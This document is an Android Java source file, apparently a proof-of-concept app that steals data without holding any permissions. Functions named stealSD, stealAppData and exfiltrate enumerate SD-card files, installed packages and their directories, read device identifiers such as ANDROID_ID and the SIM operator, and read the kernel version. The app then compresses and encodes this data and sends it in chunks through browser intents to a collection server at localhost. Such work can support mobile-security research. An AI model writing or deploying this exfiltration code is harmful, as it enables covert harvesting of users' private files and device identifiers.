package com.cassie.sensorapp.sensorapp;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.view.View;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import java.io.*;
import java.util.zip.GZIPOutputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class NoPermissionsActivity extends Activity {
    Random rand;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_no_permissions);
        rand = new Random(System.currentTimeMillis());
    }

    public void buttonHandler(View view) {
        switch (view.getId()) {
            case R.id.button1:
                stealSD();
                break;
            case R.id.button2:
                stealAppData();
                break;
            case R.id.button3:
                String version = readVersion();
                String id = readIdentifiers();
                exfiltrate(version,id);
                break;
        }
    }

    private void exfiltrate(String version, String id) {
        String send = "ver=" + version + "?" + id;
        sendByBrowser(send);
    }

    private String readIdentifiers() {
        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String op = "0", sim = "0";
        switch(tm.getPhoneType()){
            case TelephonyManager.PHONE_TYPE_GSM:
                op = tm.getNetworkOperator();
                Log.i("FileChecker","readIdentifiers - GSM Operator: "+op);
                break;
            default:
                Log.i("FileChecker","readIdentifiers - not GSM");
                break;
        }
        switch(tm.getSimState()){
            case TelephonyManager.SIM_STATE_READY:
                sim = tm.getSimOperator();
                Log.i("FileChecker","readIdentifiers - SIM Operator: "+sim);
                break;
            default:
                Log.i("FileChecker","readIdentifiers - SIM Not Ready");
                break;
        }
        String androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "gsm="+op+"&sim="+sim+"&aid="+androidID;
    }

    private String readVersion() {
        BufferedReader procversion;
        try {
            procversion = new BufferedReader(new FileReader("/proc/version"));
        } catch (FileNotFoundException e) {
            return "";
        }
        String kernel = "";
        if(procversion != null){
            try {
                kernel = procversion.readLine();
            } catch (IOException e) {
                return "";
            }
        }
        return URLEncoder.encode(kernel);
    }

    private void stealAppData() {
        BufferedReader applist;
        try {
            applist = new BufferedReader(new FileReader("/data/system/packages.list"));
        } catch (FileNotFoundException e) {
            return;
        }
        String appentry;
        List<String> apps = new ArrayList<String>();
        try {
            while( (appentry = applist.readLine()) != null){
                String[] tokens = appentry.split(" ");
                Log.i("NoPermissions","stealAppData - installed app: " + tokens[0] + " as uid "+ tokens[1]);
                apps.add(tokens[0]);
                File appdir = new File(tokens[3]);
                apps.addAll(recurse(appdir,true));
            }
        } catch (IOException e) {
        } finally {
            String send = "";
            for(String entry : apps)
                send = send + "|" + entry;
            sendGzByBrowser(send,"apps");
        }
        try {
            applist.close();
        } catch (IOException e) {
            return;
        }

    }
    private List<String> recurse(File dir){
        List<String> subdir = new ArrayList<String>();
        if(dir.isDirectory() && dir.canRead()) {
            File[] dirlist = dir.listFiles();
            for (File entry : dirlist) {
                if(entry.isDirectory()) subdir.addAll(recurse(entry));
                else {
                    subdir.add(entry.getAbsolutePath());
                }
            }
            return subdir;
        }
        return subdir;
    }

    private List<String> recurse(File dir, Boolean appdir){
        List<String> subdir = new ArrayList<String>();
        if(dir.isDirectory() && dir.canRead()) {
            File[] dirlist = dir.listFiles();
            for (File entry : dirlist) {
                if(entry.isDirectory()) subdir.addAll(recurse(entry));
                else {
                    Log.i("NoPermissions","recurse - found file: " + entry.getAbsolutePath());
                    subdir.add(entry.getAbsolutePath());
                }
            }
            return subdir;
        }else if(appdir){
            try{
                //Let's guess that we've got a base directory
                String[] guesses = {"lib","cache","files","databases","shared_prefs"};
                for(String guess : guesses){
                    File check = new File(dir,guess);
                    if(check.exists()) subdir.addAll(recurse(check));
                }
            } catch (Exception e) {
                return subdir;
            }
        }
        return subdir;
    }

    private void stealSD() {
        File sddir = new File("/sdcard");
        if(sddir.isDirectory() && sddir.canRead()) {
            List<String> listing = recurse(sddir);
            if(listing != null && listing.size() > 0) {
                String send = "";
                for(String entry : listing)
                    send = send + "|" + entry;
                sendGzByBrowser(send,"sd");
            }
        }
    }

    private void sendGzByBrowser(String string, String prefix){
        Log.i("NoPermissions", "sendGzByBrowser::"+string);
        byte[] bytes_in = string.getBytes();
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        GZIPOutputStream zos;
        try {
            zos = new GZIPOutputStream(new BufferedOutputStream(os));
            zos.write(bytes_in);
            zos.flush();
            zos.close();
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
        String data = Base64.encodeToString(os.toByteArray(), Base64.URL_SAFE|Base64.NO_WRAP|Base64.NO_PADDING);
        if(data.length() >= 500){
            sendChunked(data,prefix);
        } else {
            sendByBrowser(prefix+"="+data);
        }
    }

    public void sendByBrowser(String string) {
        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://localhost:8000/?noperms&" + string));
        startActivity(myIntent);
    }

    private void sendChunked(String string, String prefix) {
        int i = 0;
        final int SIZE = 500;
        final int pkt = rand.nextInt(10000)+1;
        Handler handler = new Handler();
        String data;
        while(string.length() > 0) {
            if(string.length() >= SIZE) {
                data = string.substring(0,SIZE);
                string = string.substring(SIZE,string.length());
            } else {
                data = new String(string);
                string = "";
            }
            handler.postDelayed(new RunBrowser(this,"type="+prefix+"&packet="+pkt+"&chunk="+i+"&data="+data), i*5000);
            i++;
        }

    }
}
